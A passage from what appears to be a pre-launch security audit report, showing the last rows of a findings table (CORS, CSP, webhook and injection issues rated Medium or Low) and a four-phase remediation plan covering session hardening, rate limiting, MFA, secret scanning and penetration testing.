| 31 | CORS misconfiguration | **Medium** | 4.3 |
| 32 | CSP headers missing | **Medium** | 7.3 |
| 33 | Secret scanning absent | **Medium** | 6.4 |
| 34 | SQL/NoSQL injection in queries | **Low** | 3.5 |
| 35 | Content-Type validation missing | **Low** | 4.4 |
| 36 | Webhook event ordering | **Low** | 5.5 |
| 37 | Webhook IP restriction absent | **Low** | 5.6 |
| 38 | SRI for CDN assets | **Low** | 7.4 |
| 39 | Concurrent health check updates | **Low** | 8.4 |

---

## Remediation Priority

**Phase 1 -- Immediate (before launch):**
- Fix all Critical items (IDOR, cloud-init injection, Stripe webhook verification)
- Implement session hardening (cookie config, brute force protection)
- Add subdomain validation with strict allowlist
- Set up Appwrite document-level permissions

**Phase 2 -- Within 2 weeks of launch:**
- Deploy rate limiting across all endpoints
- Implement constant-time secret comparison
- Add webhook idempotency
- Configure CSP headers
- Set up API key rotation schedule

**Phase 3 -- Within 30 days of launch:**
- Enable MFA for admin accounts
- Add secret scanning to CI/CD
- Implement account lockout
- Add IP allowlisting for webhook endpoints
- Set up race condition defenses (unique constraints, optimistic locking)

**Phase 4 -- Ongoing:**
- Regular API key rotation (90-day cycle)
- Penetration testing
- Dependency vulnerability scanning
- Security audit of new features before deployment
